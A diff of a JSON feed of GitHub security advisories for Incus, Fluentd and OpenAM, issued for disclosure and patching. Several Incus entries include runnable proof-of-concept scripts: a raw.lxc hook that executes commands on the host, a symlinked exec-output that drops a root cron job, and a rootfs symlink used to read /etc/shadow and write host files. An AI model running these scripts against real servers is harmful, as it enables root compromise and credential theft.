+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-vxp5-584q-c479",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-vxp5-584q-c479",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48752",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479",
+      "https://github.com/advisories/GHSA-vxp5-584q-c479"
+    ],
+    "published_at": "2026-06-26T18:46:31Z",
+    "updated_at": "2026-06-26T18:46:32Z",
+    "github_reviewed_at": "2026-06-26T18:46:31Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-73",
+        "name": "External Control of File Name or Path"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-48q5-w887-33wv",
+    "cve_id": "CVE-2026-48751",
+    "url": "https://api.github.com/advisories/GHSA-48q5-w887-33wv",
+    "html_url": "https://github.com/advisories/GHSA-48q5-w887-33wv",
+    "summary": "Incus has a restricted project bypass leading to arbitrary command execution",
+    "description": "### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#> allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-48q5-w887-33wv",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-48q5-w887-33wv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48751",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv",
+      "https://github.com/advisories/GHSA-48q5-w887-33wv"
+    ],
+    "published_at": "2026-06-26T18:33:55Z",
+    "updated_at": "2026-06-26T18:33:56Z",
+    "github_reviewed_at": "2026-06-26T18:33:55Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-73hr-m85f-64v9",
+    "cve_id": "CVE-2026-48750",
+    "url": "https://api.github.com/advisories/GHSA-73hr-m85f-64v9",
+    "html_url": "https://github.com/advisories/GHSA-73hr-m85f-64v9",
+    "summary": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image",
+    "description": "### Summary\n\nThe `record-output` parameter of the `/instances/$name/exec` endpoint stores the output of the command in the `exec-output` directory of the instance. If `exec-output` is a symlink, file named `exec_UUID.stdout` and `exec_UUID.stderr` can be written to an arbitrary location where the `.stdout` file will contain arbitrary content. This behavior can be abused for arbitrary command execution.\n\n\n### Details\n\nWhen an image is unpacked, top-level symlinks are extracted as is; allowing for `exec-output` to be placed on disk. In `instance_exec.go`, `os.Mkdir` continues of `exec-output` exists and `os.OpenFile` follows the `exec-output` symlink.\n\n\n### PoC\n\nBelow, we place the `exec_UUID.stdout` file in `/etc/cron.d` on\nthe host for arbitrary command execution.\n\n```\n#!/bin/sh\n# usage: $0 existing-imagefp\nset -eu\n\nbasefp=\"${1}\"\n\ndie() {\n        printf '%s' \"${@}\" >&2\n        exit 1\n}\n\ncommand -v curl >/dev/null 2>&1 || die 'error: curl not found\\n'\ncommand -v python3 >/dev/null 2>&1 || die 'error: python3 not found\\n'\n\ntmpdir=$(mktemp -d)\ncleanup() {\n        rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\n\n# insert exec-output symlink\n\nincus image export \"${basefp}\" \"${tmpdir}/img\"\n\nmkdir \"${tmpdir}/repack\"\ncd \"${tmpdir}/repack\"\n\nxz -cd \"${tmpdir}/img\" | tar -f- -vx\n\nrm -rf exec-output\nln -s /etc/cron.d exec-output\n\ntar -f- -c * | gzip -c9 >\"${tmpdir}/img\"\n\ncd - >/dev/null\nincus image import \"${tmpdir}\"/img* --alias afw-exec-output\n\n\n# Launch container, exec with record-output via REST API\nincus launch afw-exec-output afw-exec-output\nincus wait afw-exec-output ip\n\nOP=$(curl -s --unix-socket /var/lib/incus/unix.socket \\\n  -X POST -H 'Content-Type: application/json' \\\n  -d '{\"command\":[\"/bin/sh\",\"-c\",\"echo * * * * * root id'\"'>'\"'/afw-exec-output\"],\"record-output\":true}' \\\n  \"lxd/1.0/instances/afw-exec-output/exec\" | python3 -c \"import sys,json;print(json.load(sys.stdin)['operation'])\")\n\ncurl -s --unix-socket /var/lib/incus/unix.socket \"$OP/wait?timeout=30\" >/dev/null\n\n#find /etc/cron.d/exec_* -exec cat {} \\;\n```\n\n### Impact\n\nConstrained file creation in an arbitrary directory on the host via\nvia an unsanitized symlink; possibly leading to command execution.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-73hr-m85f-64v9",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-73hr-m85f-64v9",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48750",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-73hr-m85f-64v9",
+      "https://github.com/advisories/GHSA-73hr-m85f-64v9"
+    ],
+    "published_at": "2026-06-26T18:32:52Z",
+    "updated_at": "2026-06-26T18:32:53Z",
+    "github_reviewed_at": "2026-06-26T18:32:52Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-73",
+        "name": "External Control of File Name or Path"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-2q3f-q5pq-g8wv",
+    "cve_id": "CVE-2026-48749",
+    "url": "https://api.github.com/advisories/GHSA-2q3f-q5pq-g8wv",
+    "html_url": "https://github.com/advisories/GHSA-2q3f-q5pq-g8wv",
+    "summary": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
+    "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-2q3f-q5pq-g8wv",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-2q3f-q5pq-g8wv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48749",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv",
+      "https://github.com/advisories/GHSA-2q3f-q5pq-g8wv"
+    ],
+    "published_at": "2026-06-26T18:31:21Z",
+    "updated_at": "2026-06-26T18:31:23Z",
+    "github_reviewed_at": "2026-06-26T18:31:21Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-73",
+        "name": "External Control of File Name or Path"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-44hj-4m45-frj3",
+    "cve_id": "CVE-2026-44024",
+    "url": "https://api.github.com/advisories/GHSA-44hj-4m45-frj3",
+    "html_url": "https://github.com/advisories/GHSA-44hj-4m45-frj3",
+    "summary": "Fluentd is Vulnerable to Remote Code Execution (RCE) via Arbitrary File Write in `${tag}` Placeholder",
+    "description": "Fluentd allows dynamically constructing file paths using the `${tag}` placeholder.\nIt was discovered that validation for this placeholder was insufficient.\n\nIf a Fluentd instance is configured to receive logs from untrusted sources and uses the `${tag}` placeholder in file configurations (such as the `path` parameter in the `out_file` plugin), an attacker can inject path traversal characters (e.g., `../`).\n\nWhen combined with certain formatting options, this vulnerability allows an attacker to write arbitrary files or overwrite existing files on the system with attacker-controlled content, bypassing intended directory restrictions.\n\n### Impact\nThis vulnerability allows for **Arbitrary File Write**, which can be directly escalated to full **Remote Code Execution (RCE)**.\nAn attacker could achieve RCE by overwriting critical system files, injecting executable plugins, or modifying configuration files.\nThe impact is Critical as it can lead to full system compromise without any authentication, depending on the Fluentd configuration and the privileges of the Fluentd process.\n\n### Patches\nv1.19.3\n\n### Workarounds\nIf an immediate upgrade is not possible, users are strongly advised to apply the following mitigations:\n\n1. Restrict Network Access\n   * Ensure that Fluentd input ports (such as `in_forward` on default port `24224`) are deployed within a closed, trusted network. Use firewall rules (e.g., iptables, AWS Security Groups) to block access from untrusted networks or instances.\n2. Run Fluentd as a non-root user\n   * Dropping privileges prevents Fluentd from writing to sensitive system directories (e.g., `/etc/`), significantly mitigating the risk of system-wide RCE.\n3. Revise configurations\n   * Do not use the `${tag}` placeholder in the `path` parameter of output plugins (like `out_file`) if the tag originates from an untrusted source.\n4. Filter incoming tags\n   * Strictly validate and filter incoming tags at the input layer (e.g., using `fluent-plugin-rewrite-tag-filter`) to drop any tags containing `.` or `/` characters.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/fluent/fluentd/security-advisories/GHSA-44hj-4m45-frj3",
+    "source_code_location": "https://github.com/fluent/fluentd",
+    "identifiers": [
+      {
+        "value": "GHSA-44hj-4m45-frj3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-44024",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/fluent/fluentd/security/advisories/GHSA-44hj-4m45-frj3",
+      "https://github.com/fluent/fluentd/releases/tag/v1.19.3",
+      "https://github.com/advisories/GHSA-44hj-4m45-frj3"
+    ],
+    "published_at": "2026-06-26T16:32:05Z",
+    "updated_at": "2026-06-26T16:32:06Z",
+    "github_reviewed_at": "2026-06-26T16:32:05Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rubygems",
+          "name": "fluentd"
+        },
+        "vulnerable_version_range": "<= 1.19.2",
+        "first_patched_version": "1.19.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "everping",
+          "id": 5586195,
+          "node_id": "MDQ6VXNlcjU1ODYxOTU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/5586195?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/everping",
+          "html_url": "https://github.com/everping",
+          "followers_url": "https://api.github.com/users/everping/followers",
+          "following_url": "https://api.github.com/users/everping/following{/other_user}",
+          "gists_url": "https://api.github.com/users/everping/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/everping/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/everping/subscriptions",
+          "organizations_url": "https://api.github.com/users/everping/orgs",
+          "repos_url": "https://api.github.com/users/everping/repos",
+          "events_url": "https://api.github.com/users/everping/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/everping/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    }
+  },
+  {
     "ghsa_id": "GHSA-x527-x647-q7gg",
     "cve_id": "CVE-2026-46595",
     "url": "https://api.github.com/advisories/GHSA-x527-x647-q7gg",
@@ -719,7 +2263,7 @@
     },
     "epss": {
       "percentage": 0.00419,
-      "percentile": 0.33385
+      "percentile": 0.3354
     }
   },
   {
@@ -815,187 +2359,7 @@
     },
     "epss": {
       "percentage": 0.00419,
-      "percentile": 0.33384
-    }
-  },
-  {
-    "ghsa_id": "GHSA-p462-xxwx-pqf4",
-    "cve_id": "CVE-2026-45052",
-    "url": "https://api.github.com/advisories/GHSA-p462-xxwx-pqf4",
-    "html_url": "https://github.com/advisories/GHSA-p462-xxwx-pqf4",
-    "summary": "OpenAM Pre-auth User Profile Tampering via Anonymous SOAP Authn in Liberty IDPP/Discovery Endpoints",
-    "description": "## Summary\n\n**Description**\n\nAn Improper Authorization (CWE-285) issue in OpenAM's Liberty Web Services SOAP receiver allows an unauthenticated remote attacker to write persistent entries into the Liberty Discovery store on any user's LDAP entry, and into a shared root-realm Discovery branch. This impacts OpenAM Community Edition through version 16.0.6. This issue was patched in version 16.1.1.\n\nLiberty ID-WSF is a legacy protocol superseded by SAML 2.0, OAuth, and OIDC, and deployments that intentionally leverage it assume the risks of an unmaintained federation stack. While Liberty is exposed in the shipped defaults, this bug does not require active Liberty consumers for the write itself. Downstream impact depends on whether anything consumes Discovery data. The endpoint accepts anonymous writes that are performed server-side by the Discovery handlers, bypassing the requester's LDAP and identity ACLs. The global Discovery path explicitly uses the internal admin token.\n\n## Impact\n\nOpenAM Community Edition deployments through version 16.0.6 that expose the Liberty Web Services component are potentially affected. An unauthenticated attacker who can reach the relevant endpoint may write persistent records to the discovery store, bypassing normal identity-layer access controls. \n\nThese writes are performed with elevated internal privileges server-side.\nIn deployments that actively consume Liberty discovery data, manipulated records could influence service routing or security mechanism selection in subsequent requests. The severity of downstream impact varies by deployment..\n\n## Patch\nThis has been patched in OpenAM Community Edition version 16.1.1. Users are encouraged to update to the latest release.",
-    "type": "reviewed",
-    "severity": "critical",
-    "repository_advisory_url": "https://api.github.com/repos/OpenIdentityPlatform/OpenAM/security-advisories/GHSA-p462-xxwx-pqf4",
-    "source_code_location": "https://github.com/OpenIdentityPlatform/OpenAM",
-    "identifiers": [
-      {
-        "value": "GHSA-p462-xxwx-pqf4",
-        "type": "GHSA"
-      },
-      {
-        "value": "CVE-2026-45052",
-        "type": "CVE"
-      }
-    ],
-    "references": [
-      "https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-p462-xxwx-pqf4",
-      "https://github.com/advisories/GHSA-p462-xxwx-pqf4"
-    ],
-    "published_at": "2026-06-24T17:31:17Z",
-    "updated_at": "2026-06-24T17:31:18Z",
-    "github_reviewed_at": "2026-06-24T17:31:17Z",
-    "nvd_published_at": null,
-    "withdrawn_at": null,
-    "vulnerabilities": [
-      {
-        "package": {
-          "ecosystem": "maven",
-          "name": "org.openidentityplatform.openam:openam-federation-library"
-        },
-        "vulnerable_version_range": "<= 16.0.6",
-        "first_patched_version": "16.1.1",
-        "vulnerable_functions": [
-
-        ]
-      }
-    ],
-    "cvss_severities": {
-      "cvss_v3": {
-        "vector_string": null,
-        "score": 0.0
-      },
-      "cvss_v4": {
-        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:L/SA:N",
-        "score": 9.3
-      }
-    },
-    "cwes": [
-      {
-        "cwe_id": "CWE-285",
-        "name": "Improper Authorization"
-      }
-    ],
-    "credits": [
-      {
-        "user": {
-          "login": "wodzen",
-          "id": 25558174,
-          "node_id": "MDQ6VXNlcjI1NTU4MTc0",
-          "avatar_url": "https://avatars.githubusercontent.com/u/25558174?v=4",
-          "gravatar_id": "",
-          "url": "https://api.github.com/users/wodzen",
-          "html_url": "https://github.com/wodzen",
-          "followers_url": "https://api.github.com/users/wodzen/followers",
-          "following_url": "https://api.github.com/users/wodzen/following{/other_user}",
-          "gists_url": "https://api.github.com/users/wodzen/gists{/gist_id}",
-          "starred_url": "https://api.github.com/users/wodzen/starred{/owner}{/repo}",
-          "subscriptions_url": "https://api.github.com/users/wodzen/subscriptions",
-          "organizations_url": "https://api.github.com/users/wodzen/orgs",
-          "repos_url": "https://api.github.com/users/wodzen/repos",
-          "events_url": "https://api.github.com/users/wodzen/events{/privacy}",
-          "received_events_url": "https://api.github.com/users/wodzen/received_events",
-          "type": "User",
-          "user_view_type": "public",
-          "site_admin": false
-        },
